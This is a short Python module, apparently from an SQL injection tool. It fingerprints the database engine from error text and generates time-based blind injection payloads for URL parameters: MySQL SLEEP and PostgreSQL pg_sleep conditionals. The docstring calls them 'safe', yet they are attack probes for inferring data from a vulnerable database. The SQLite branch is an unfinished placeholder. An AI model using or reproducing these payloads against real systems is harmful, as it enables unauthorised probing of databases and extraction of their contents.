import re

def fingerprint_sql_output(output_text: str) -> str:
    """Try to detect DB engine from error/output text."""
    txt = output_text.lower()
    if 'sqlite3' in txt or 'sqlite' in txt:
        return 'sqlite'
    if 'mysql' in txt or 'mariadb' in txt:
        return 'mysql'
    if 'psql' in txt or 'postgresql' in txt or 'pg_' in txt:
        return 'postgresql'
    # heuristics
    if re.search(r"syntax error at", txt):
        return 'postgresql'
    if 'you have an error in your sql syntax' in txt:
        return 'mysql'
    return 'unknown'

def safe_time_payload_for_engine(engine: str, true_condition: str = '1=1') -> str:
    """Return a safe time-based payload snippet usable in URL parameters per engine."""
    if engine == 'mysql':
        return "IF(%s,SLEEP(5),0)" % true_condition
    if engine == 'postgresql':
        # pg_sleep(seconds)
        return "CASE WHEN %s THEN pg_sleep(5) ELSE pg_sleep(0) END" % true_condition
    if engine == 'sqlite':
        # sqlite has no sleep(); use a heavy randomblob or a busy loop via (SELECT) trick
        return "(SELECT 1)"  # placeholder; sqlite time-based blind requires different approaches
    return 'unknown'
